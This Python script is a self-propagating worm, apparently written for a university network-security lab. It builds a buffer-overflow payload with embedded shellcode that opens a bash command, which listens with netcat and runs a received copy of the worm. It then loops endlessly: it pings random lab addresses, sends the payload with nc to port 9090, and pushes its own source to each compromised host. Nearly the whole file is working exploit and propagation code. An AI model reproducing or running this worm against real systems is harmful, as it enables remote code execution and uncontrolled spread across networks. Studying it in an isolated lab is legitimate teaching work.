#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   "echo '(^_^) Shellcode is running (^_^)';nc -lnv 8080 >      "
   "worm.py; chmod +x worm.py; ./worm.py                        "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   # address of shellcode in absolute address space
   ret    = 0xffffd588 + (500-len(shellcode))
   # relative offset
   #   from address of buffer local variable
   #   to address of return address on the stack
   # offset to frame pointer + 4B (saved previous frame pointer)
   offset = 0x70 + 0x04

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   targetFound = False
   ipCandidate = ""
   while not targetFound:
      ipCandidate = f"10.{randint(151,155)}.0.{randint(70,80)}"
      
      try:
         output = subprocess.check_output(f"ping -q -c1 -W1 {ipCandidate}", shell=True)
         result = output.find(b'1 received')
      except subprocess.CalledProcessError:
         result = -1
      targetFound = result != -1

   
   print(f"*** Target {ipCandidate} is alive, launch the attack", flush=True)
   return ipCandidate
   
   
# Check if our worm is already present on this host.
# If host contains 'badfile' in current location, it's considered already infected.
# os.open with O_EXCL flag is atomic: https://linux.die.net/man/3/open
def checkSelfPresence():
   try:
      os.open('badfile',  os.O_CREAT | os.O_EXCL)
      return False
   except FileExistsError:
      return True
   


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

if checkSelfPresence():
   print("This host is already infected, not propagating self..", flush=True)
   exit(0)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)

    # send self to the infected machine
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8080"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    #exit(0)